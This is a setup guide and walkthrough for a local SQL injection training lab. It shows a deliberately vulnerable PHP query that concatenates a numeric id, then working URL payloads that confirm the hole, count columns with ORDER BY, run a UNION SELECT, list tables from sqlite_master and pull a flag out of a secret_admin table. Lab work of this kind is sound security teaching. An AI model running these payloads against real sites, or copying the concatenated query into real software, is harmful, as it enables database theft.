# SQL Injection Numeric Lab - Setup Guide

## Quick Start

```bash
chmod +x start.sh
./start.sh
```

## Walkthrough

### Numeric vs String Parameters

**String parameter (needs quotes):**
```php
$query = "SELECT * FROM users WHERE username = '$username'";
                                                    ↑        ↑
                                                    quotes needed
```

**Numeric parameter (no quotes):**
```php
$query = "SELECT * FROM products WHERE id = " . $id;
                                                    ↑
                                                    NO quotes!
```

### Step 1: Test Vulnerability

```
http://localhost:PORT/?id=1 AND 1=1
```

Query becomes: `SELECT * FROM products WHERE id = 1 AND 1=1`

If page loads normally → Vulnerable!

### Step 2: Find Column Count

```
?id=1 ORDER BY 6--    (works)
?id=1 ORDER BY 7--    (error)
```

Result: 6 columns

### Step 3: Test UNION

```
?id=-1 UNION SELECT 1,2,3,4,5,6--
```

Use `-1` so no product matches.

### Step 4: Discover Tables

```
?id=-1 UNION SELECT 1,sql,3,4,5,6 FROM sqlite_master WHERE type='table'--
```

Reveals: `products` and `secret_admin`

### Step 5: Extract Flag

```
?id=-1 UNION SELECT 1,admin_value,3,4,5,6 FROM secret_admin WHERE admin_key='flag'--
```

Flag appears in product name!

## Clean Start

```bash
docker stop sqli-lab-numeric && docker rm sqli-lab-numeric
rm -rf app/database/
```
